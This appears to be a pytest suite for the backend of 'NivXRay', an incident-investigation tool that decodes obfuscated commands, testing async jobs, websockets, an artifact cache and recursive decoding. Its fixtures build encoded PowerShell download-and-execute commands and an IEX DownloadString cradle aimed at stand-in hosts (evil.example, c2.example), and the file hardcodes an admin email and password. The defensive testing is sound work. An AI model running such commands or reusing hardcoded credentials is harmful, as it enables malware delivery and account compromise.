"""P0.1/P0.2/P0.3 backend tests for NivXRay AUTO INVESTIGATE async.

Covers:
  - POST /api/v2/auto-investigate/jobs (returns quickly)
  - GET  /api/v2/auto-investigate/jobs/{id}
  - WS   /api/v2/auto-investigate/jobs/{id}/ws?token=<jwt>
  - WS   4401 close on bad/missing token
  - Decoded Artifact Store cache-hit + provenance
  - Recursive decode chain / recursive_stats
  - Sync fallback POST /api/v2/auto-investigate compat
  - Raw base64 (no shell binary) fallback command
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import time
import uuid

import pytest
import requests
import websockets

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://greeting-app-5782.preview.emergentagent.com").rstrip("/")
WS_URL = BASE_URL.replace("https://", "wss://").replace("http://", "ws://")

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASS = "uulVDp5cCSB3Hva99s7UUAwK"

# A unique-per-run PowerShell -EncodedCommand payload so caching is deterministic
_NONCE = uuid.uuid4().hex[:8]
_INNER = f"Invoke-WebRequest -Uri http://evil.example/{_NONCE}.exe -OutFile $env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe"
_UTF16 = _INNER.encode("utf-16-le")
_B64 = base64.b64encode(_UTF16).decode("ascii")
INCIDENT_TEXT = f"Suspicious process observed:\n\npowershell.exe -NoP -W hidden -EncodedCommand {_B64}\n"

# Large-ish payload (still small enough to run fast) to prove POST is non-blocking
LARGE_INCIDENT = INCIDENT_TEXT + "\n\n" + ("noise line " * 20000)  # ~200 KB
RAW_B64_INCIDENT = base64.b64encode(("http://malicious.example/dropper.exe " * 20).encode()).decode()


# ─────────────── fixtures ───────────────
@pytest.fixture(scope="session")
def jwt_token() -> str:
    last_err = None
    for attempt in range(4):
        try:
            r = requests.post(f"{BASE_URL}/api/auth/login",
                              json={"email": ADMIN_EMAIL, "password": ADMIN_PASS}, timeout=60)
            assert r.status_code == 200, f"login failed {r.status_code} {r.text}"
            tok = r.json().get("access_token") or r.json().get("token")
            assert tok, f"no token in {r.json()}"
            return tok
        except Exception as e:
            last_err = e
            time.sleep(2 + attempt * 2)
    raise last_err


@pytest.fixture(scope="session")
def auth_headers(jwt_token) -> dict:
    return {"Authorization": f"Bearer {jwt_token}", "Content-Type": "application/json"}


# ─────────────── P0.1: async jobs ───────────────
class TestAsyncJobs:
    def test_post_job_returns_fast(self, auth_headers):
        t0 = time.time()
        r = requests.post(f"{BASE_URL}/api/v2/auto-investigate/jobs",
                          json={"incident_text": LARGE_INCIDENT},
                          headers=auth_headers, timeout=10)
        dt = time.time() - t0
        assert r.status_code == 200, r.text
        data = r.json()
        assert data.get("ok") is True
        assert "job_id" in data
        assert "ws_path" in data and data["ws_path"].endswith("/ws")
        assert dt < 5.0, f"POST /jobs took {dt:.2f}s — should be < 2s (allowing 5s slack)"

    def test_get_job_polling(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/v2/auto-investigate/jobs",
                          json={"incident_text": INCIDENT_TEXT},
                          headers=auth_headers, timeout=10)
        assert r.status_code == 200
        job_id = r.json()["job_id"]

        # Poll for completion (max 90s)
        deadline = time.time() + 90
        final = None
        while time.time() < deadline:
            g = requests.get(f"{BASE_URL}/api/v2/auto-investigate/jobs/{job_id}",
                             headers=auth_headers, timeout=15)
            assert g.status_code == 200, g.text
            body = g.json()
            if body["status"] in ("complete", "failed"):
                final = body
                break
            time.sleep(1.5)

        assert final is not None, "job did not complete within 90s"
        assert final["status"] == "complete", f"final status={final['status']} err={final.get('error')}"
        assert "progress" in final
        assert isinstance(final.get("decode_statuses"), list)
        assert final.get("result") is not None


# ─────────────── P0.1: WebSocket ───────────────
class TestWebSocket:
    def test_ws_rejects_missing_token(self):
        async def run():
            ws_url = f"{WS_URL}/api/v2/auto-investigate/jobs/fake-id/ws"
            try:
                async with websockets.connect(ws_url, open_timeout=30) as ws:
                    await asyncio.wait_for(ws.recv(), timeout=10)
                    return None
            except websockets.exceptions.InvalidStatus as e:
                return ("http", e.response.status_code)
            except websockets.exceptions.ConnectionClosed as e:
                return ("closed", e.code)
            except Exception as e:  # noqa: BLE001
                return ("err", str(e))

        result = asyncio.run(run())
        # Should either be closed 4401 or rejected with HTTP status (some proxies)
        assert result is not None, "connection unexpectedly succeeded"
        kind, code = result
        assert (kind == "closed" and code == 4401) or (kind == "http" and code in (401, 403)), \
            f"unexpected rejection: {result}"

    def test_ws_streams_events_and_replay(self, jwt_token, auth_headers):
        # Create job
        r = requests.post(f"{BASE_URL}/api/v2/auto-investigate/jobs",
                          json={"incident_text": INCIDENT_TEXT},
                          headers=auth_headers, timeout=10)
        assert r.status_code == 200
        job_id = r.json()["job_id"]

        events: list[dict] = []

        async def stream():
            ws_url = f"{WS_URL}/api/v2/auto-investigate/jobs/{job_id}/ws?token={jwt_token}"
            async with websockets.connect(ws_url, max_size=None) as ws:
                try:
                    while True:
                        msg = await asyncio.wait_for(ws.recv(), timeout=90)
                        ev = json.loads(msg)
                        events.append(ev)
                        if ev.get("type") == "done":
                            break
                except asyncio.TimeoutError:
                    pass

        asyncio.run(stream())

        types = [e.get("type") for e in events]
        print("WS event types:", types)
        assert "progress" in types, f"no progress events, got={types}"
        assert "done" in types, f"no done event, got={types}"
        # These should exist for our PS -EncodedCommand:
        assert "command" in types or "decode_chain" in types, f"no decode events, got={types}"
        assert "result" in types, f"no result event, got={types}"

        # Replay: connect to the same job after done
        replayed: list[dict] = []

        async def replay():
            ws_url = f"{WS_URL}/api/v2/auto-investigate/jobs/{job_id}/ws?token={jwt_token}"
            async with websockets.connect(ws_url, max_size=None) as ws:
                try:
                    while True:
                        msg = await asyncio.wait_for(ws.recv(), timeout=15)
                        ev = json.loads(msg)
                        replayed.append(ev)
                        if ev.get("type") == "done":
                            break
                except asyncio.TimeoutError:
                    pass

        # Wait past 5s pubsub grace window
        time.sleep(7)
        asyncio.run(replay())
        rt = [e.get("type") for e in replayed]
        assert "done" in rt, f"replay missing done: {rt}"


# ─────────────── P0.2: Decoded Artifact Store ───────────────
class TestDecodedArtifactCache:
    def test_cache_hit_on_second_run(self, auth_headers):
        # Get baseline stats
        s0 = requests.get(f"{BASE_URL}/api/v2/decoded-artifacts/stats/summary",
                          headers=auth_headers, timeout=15).json()
        base_reuses = s0.get("total_reuses", 0)
        base_artifacts = s0.get("total_artifacts", 0)

        # Use a unique-per-test-run incident so first run guarantees a miss
        nonce = uuid.uuid4().hex[:10]
        inner = f"IEX (New-Object Net.WebClient).DownloadString('http://c2.example/{nonce}')"
        b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
        incident = f"powershell.exe -EncodedCommand {b64}"

        def run_async_job():
            j = requests.post(f"{BASE_URL}/api/v2/auto-investigate/jobs",
                              json={"incident_text": incident},
                              headers=auth_headers, timeout=15).json()
            job_id = j["job_id"]
            deadline = time.time() + 60
            while time.time() < deadline:
                g = requests.get(f"{BASE_URL}/api/v2/auto-investigate/jobs/{job_id}",
                                 headers=auth_headers, timeout=15).json()
                if g["status"] in ("complete", "failed"):
                    return g
                time.sleep(1.5)
            raise AssertionError("job timeout")

        first = run_async_job()
        assert first["status"] == "complete", first.get("error")
        second = run_async_job()
        assert second["status"] == "complete", second.get("error")

        s1 = requests.get(f"{BASE_URL}/api/v2/decoded-artifacts/stats/summary",
                          headers=auth_headers, timeout=15).json()
        print("stats before:", s0, " after:", s1)
        assert s1.get("total_artifacts", 0) >= base_artifacts + 1, \
            f"total_artifacts should have grown ({base_artifacts}→{s1.get('total_artifacts')})"
        assert s1.get("total_reuses", 0) > base_reuses, \
            f"total_reuses did not increment ({base_reuses}→{s1.get('total_reuses')})"

        # 2nd job should have cache_hit in decode_statuses
        statuses = second.get("decode_statuses", [])
        cache_hits = [s for s in statuses if s.get("status") == "cache_hit"]
        assert cache_hits, f"expected at least one status=cache_hit on 2nd run, got={statuses}"

    def test_artifact_get_and_list(self, auth_headers):
        lst = requests.get(f"{BASE_URL}/api/v2/decoded-artifacts?limit=5",
                          headers=auth_headers, timeout=15).json()
        assert lst.get("ok") is True
        assert isinstance(lst.get("items"), list)
        if lst["items"]:
            sha = lst["items"][0].get("sha256")
            assert sha
            g = requests.get(f"{BASE_URL}/api/v2/decoded-artifacts/{sha}",
                            headers=auth_headers, timeout=15).json()
            assert g.get("ok") is True
            art = g["artifact"]
            assert art.get("sha256") == sha
            assert "provenance" in art
            assert "hit_count" in art["provenance"]

        # 404
        r404 = requests.get(f"{BASE_URL}/api/v2/decoded-artifacts/deadbeef" * 4,
                           headers=auth_headers, timeout=15)
        assert r404.status_code == 404


# ─────────────── P0.3: Recursive Decode Chain ───────────────
class TestRecursiveDecode:
    def _run_job_to_completion(self, incident, auth_headers):
        r = requests.post(f"{BASE_URL}/api/v2/auto-investigate/jobs",
                          json={"incident_text": incident},
                          headers=auth_headers, timeout=15)
        assert r.status_code == 200, r.text
        job_id = r.json()["job_id"]
        deadline = time.time() + 90
        while time.time() < deadline:
            g = requests.get(f"{BASE_URL}/api/v2/auto-investigate/jobs/{job_id}",
                             headers=auth_headers, timeout=15).json()
            if g["status"] in ("complete", "failed"):
                return g
            time.sleep(1.5)
        raise AssertionError("job did not complete in 90s")

    def test_chain_and_stats_present(self, auth_headers):
        final = self._run_job_to_completion(INCIDENT_TEXT, auth_headers)
        assert final["status"] == "complete", final.get("error")
        result = final["result"] or {}
        dp = result.get("decode_pipeline") or {}
        chains = dp.get("chains") or []
        rs = dp.get("recursive_stats") or {}
        assert chains, f"no decode_pipeline.chains — keys={list(dp.keys())}"
        # Layer structure
        c0 = chains[0]
        layers = c0.get("layers") or []
        assert layers, f"chain has no layers: {c0}"
        first = layers[0]
        for k in ("layer", "decoder", "confidence", "in_len", "out_len", "exec_ms", "preview"):
            assert k in first, f"layer missing '{k}': {first}"
        # Look for expected decoders
        decoder_names = " ".join([str(l.get("decoder", "")).lower() for l in layers])
        assert "base64" in decoder_names or "utf16" in decoder_names, \
            f"expected base64/utf16 decoder in {decoder_names}"

        # recursive_stats
        for k in ("commands_analysed", "total_layers", "avg_layers", "max_depth",
                  "total_layer_ms", "top_decoders", "success_rate"):
            assert k in rs, f"recursive_stats missing '{k}': {rs}"


# ─────────────── Sync fallback + raw payload fallback ───────────────
class TestSyncAndFallback:
    def test_sync_endpoint_backward_compat(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/v2/auto-investigate",
                          json={"incident_text": INCIDENT_TEXT},
                          headers=auth_headers, timeout=90)
        assert r.status_code == 200, r.text
        d = r.json()
        # Actual sync response shape
        assert d.get("ok") is True
        assert "raw_incident" in d
        assert "detected" in d and "commands" in d["detected"]
        assert "final_incident_summary" in d
        fis = d["final_incident_summary"]
        for k in ("executive_summary", "verdict", "iocs", "mitre_attack"):
            assert k in fis, f"missing final_incident_summary.{k}"

    def test_raw_base64_fallback_command(self, auth_headers):
        r = requests.post(f"{BASE_URL}/api/v2/auto-investigate",
                          json={"incident_text": RAW_B64_INCIDENT},
                          headers=auth_headers, timeout=90)
        assert r.status_code == 200, r.text
        d = r.json()
        cmds = (d.get("detected") or {}).get("commands") or []
        assert cmds, f"expected at least one synthetic command, got {d.get('detected')}"
        binaries = [c.get("binary") for c in cmds]
        assert any(b == "raw_payload" for b in binaries), f"binaries={binaries}"
